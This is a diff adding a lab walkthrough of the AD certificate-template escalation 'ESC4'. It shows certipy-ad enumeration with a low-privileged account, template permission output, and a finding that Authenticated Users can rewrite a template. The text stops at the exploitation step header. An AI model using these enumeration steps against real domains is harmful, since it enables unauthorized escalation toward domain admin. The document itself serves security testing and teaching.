@@ -1,0 +1,221 @@
+=======================================================================================================================================
+ADCS Domain Escalation technique "ESC4" - Vulnerable Certificate Template Access Control
+=======================================================================================================================================
+
+-----------------------------------------------------------------------------------------------------------
+Conditions making an AD environment vulnerable to "ESC4" - Vulnerable Certificate Template Access Control
+-----------------------------------------------------------------------------------------------------------
+
+- Certificate templates are AD objects and have a security descriptor that defines which permissiones AD principals have over the templates.
+  Weak permissions (Excessive Access rights) can allow a malevolent non-privileged user to edit sensitive security settings in the template 
+  (defines EKUs, allows SAN, disable manager approval), thereby making its vulnerable to the ESC1-3 technique.
+
+- Interesting rights over certificate templates:
+  > Owner: Implicit full control of the object, can edit any properties.
+  > FullControl: Full control of the object, can edit any properties.
+  > WriteOwner: Can modify the owner to an attacker-controlled principal.
+  > WriteDacl: Can modify access control to grant an attacker FullControl.
+  > WriteProperty: Can edit any properties
+  
+-----------------------------------------------------------------------------------------------
+Various tools can be used to identify and exploit the ADCS Domain Escalation technique "ESC4"
+-----------------------------------------------------------------------------------------------
+- Certutil (native windows command)
+- Certify.exe (https://github.com/GhostPack/Certify)
+- Certipy.py / certipy-ad (https://github.com/ly4k/Certipy)
+- PSPKIAudit.psm1 (https://github.com/GhostPack/PSPKIAudit)
+- PassTheCert.exe (https://github.com/AlmondOffSec/PassTheCert)
+- ...
+
+Info
+-----
+- Lab domain name: company.work
+- Lab domain controller (with ADCS) : dc1.company.work
+- Low priv domain user: LowPrivUser
+
+
+========================================================================================================================================
+PoC - Privilege escalation from Domain User to Domain Admin by exploiting the "Vulnerable Certificate Template Access Control" (ESC4) 
+========================================================================================================================================
+
+=================================================================================================================
+STEP 1 - ADCS enumeration using a low privileged domain user and the tool "certipy-ad"
+=================================================================================================================
+
+jeff@kali:~$ sudo apt-get install certipy-ad
+Reading package lists... Done
+Building dependency tree... Done
+Reading state information... Done
+<SNIP>
+
+jeff@kali:~$ sudo su
+[sudo] password for jeff: 
+root@kali:/home/jeff#
+
+root@kali:/home/jeff# certipy-ad find -u LowPrivUser@company.work -p 'SuperGenialPwd' -target 192.168.1.167
+Certipy v4.0.0 - by Oliver Lyak (ly4k)
+[*] Finding certificate templates
+[*] Found 35 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 14 enabled certificate templates
+[*] Trying to get CA configuration for 'company-DC1-CA' via CSRA
+[!] Got error while trying to get CA configuration for 'company-DC1-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+[*] Trying to get CA configuration for 'company-DC1-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Got CA configuration for 'company-DC1-CA'
+[*] Saved BloodHound data to '20230606011147_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
+[*] Saved text output to '20230606011147_Certipy.txt'
+[*] Saved JSON output to '20230606011147_Certipy.json'
+
+
+=================================================================================================================
+STEP 2 - Identify the ADCS privesc "Vulnerable Certificate Template Access Control" (ESC4) 
+=================================================================================================================
+
+=> Let's have a look at the bloodhound data files extracted with "certpy-ad"
+
+root@kali:/home/jeff# unzip 20230606011147_Certipy.zip -d ./
+Archive:  20230606011147_Certipy.zip
+ extracting: ./20230606011147_cas.json  
+ extracting: ./20230606011147_templates.json 
+ 
+root@kali:/home/jeff# cat 20230606011147_templates.json
+
+<SNIP>
+{
+      "Properties": {
+        "name": "EXCHANGE_USER_TEMPLATE@COMPANY.WORK",
+        "highvalue": false,
+        "Template Name": "Exchange_User_Template",
+        "Display Name": "Exchange_User_Template",
+        "Enabled": true,
+        "Client Authentication": false,
+        "Enrollment Agent": false,
+        "Any Purpose": false,
+        "Enrollee Supplies Subject": true,
+        "Certificate Name Flag": [ "EnrolleeSuppliesSubject" ],
+        "Enrollment Flag": [ "PendAllRequests", "IncludeSymmetricAlgorithms" ],
+        "Private Key Flag": [ "16777216", "65536", "ExportableKey" ],
+        "Extended Key Usage": [ "Secure Email" ],
+        "Requires Manager Approval": true,
+        "Requires Key Archival": false,
+        "Authorized Signatures Required": 1,
+        "Validity Period": "1 year",
+        "Renewal Period": "6 weeks",
+        "domain": "COMPANY.WORK"
+      },
+      "ObjectIdentifier": "d5ab34bc-63eb-42bc-b91e-87579f48976e",
+      "Aces": [
+        {
+          "PrincipalSID": "S-1-5-21-844310393-2305947092-3799914435-500",
+          "PrincipalType": "User",
+          "RightName": "Owns",
+          "IsInherited": false
+        },
+        {
+          "PrincipalSID": "S-1-5-21-844310393-2305947092-3799914435-512",
+          "PrincipalType": "Group",
+          "RightName": "WriteOwner",
+          "IsInherited": false
+        },
+        {
+          "PrincipalSID": "S-1-5-21-844310393-2305947092-3799914435-512",
+          "PrincipalType": "Group",
+          "RightName": "WriteDacl",
+          "IsInherited": false
+        },
+        {
+          "PrincipalSID": "S-1-5-21-844310393-2305947092-3799914435-512",
+          "PrincipalType": "Group",
+          "RightName": "WriteProperty",
+          "IsInherited": false
+        },
+        {
+          "PrincipalSID": "S-1-5-21-844310393-2305947092-3799914435-512",
+          "PrincipalType": "Group",
+          "RightName": "Enroll",
+          "IsInherited": false
+        },
+        {
+          "PrincipalSID": "S-1-5-21-844310393-2305947092-3799914435-519",
+          "PrincipalType": "Group",
+          "RightName": "WriteOwner",
+          "IsInherited": false
+        },
+        {
+          "PrincipalSID": "S-1-5-21-844310393-2305947092-3799914435-519",
+          "PrincipalType": "Group",
+          "RightName": "WriteDacl",
+          "IsInherited": false
+        },
+        {
+          "PrincipalSID": "S-1-5-21-844310393-2305947092-3799914435-519",
+          "PrincipalType": "Group",
+          "RightName": "WriteProperty",
+          "IsInherited": false
+        },
+        {
+          "PrincipalSID": "S-1-5-21-844310393-2305947092-3799914435-519",
+          "PrincipalType": "Group",
+          "RightName": "Enroll",
+          "IsInherited": false
+        },
+        {
+          "PrincipalSID": "S-1-5-21-844310393-2305947092-3799914435-500",
+          "PrincipalType": "User",
+          "RightName": "WriteOwner",
+          "IsInherited": false
+        },
+        {
+          "PrincipalSID": "S-1-5-21-844310393-2305947092-3799914435-500",
+          "PrincipalType": "User",
+          "RightName": "WriteDacl",
+          "IsInherited": false
+        },
+        {
+          "PrincipalSID": "S-1-5-21-844310393-2305947092-3799914435-500",
+          "PrincipalType": "User",
+          "RightName": "WriteProperty",
+          "IsInherited": false
+        },
+        {
+          "PrincipalSID": "COMPANY.WORK-S-1-5-11",
+          "PrincipalType": "Group",
+          "RightName": "WriteOwner",
+          "IsInherited": false
+        },
+        {
+          "PrincipalSID": "COMPANY.WORK-S-1-5-11",
+          "PrincipalType": "Group",
+          "RightName": "WriteDacl",
+          "IsInherited": false
+        },
+        {
+          "PrincipalSID": "COMPANY.WORK-S-1-5-11",
+          "PrincipalType": "Group",
+          "RightName": "WriteProperty",
+          "IsInherited": false
+        }
+<SNIP>
+
+rpcclient $> lookupnames "Authenticated Users"
+Authenticated Users S-1-5-11 (Well-known Group: 5)
+
+
+=> Conclusion: The "Exchange_User_Template" is prone to the domain privesc vulnerability "ESC4"
+-------------------------------------------------------------------------------------------------
+Indeed, the group "Authenticated Users" ( SID "S-1-5-11") has the following permissions over the certficate template "Exchange_User_Template":
+  > WriteOwner: Can modify the owner to an attacker-controlled principal.
+  > WriteDacl: Can modify access control to grant an attacker FullControl.
+  > WriteProperty: Can edit any properties
+
+
+=================================================================================================================
+STEP 3 - Exploit the "ESC4" vulnerability to escalate your privileges from a Domain User to Domain Admin
+=================================================================================================================
+
+
+
+
+
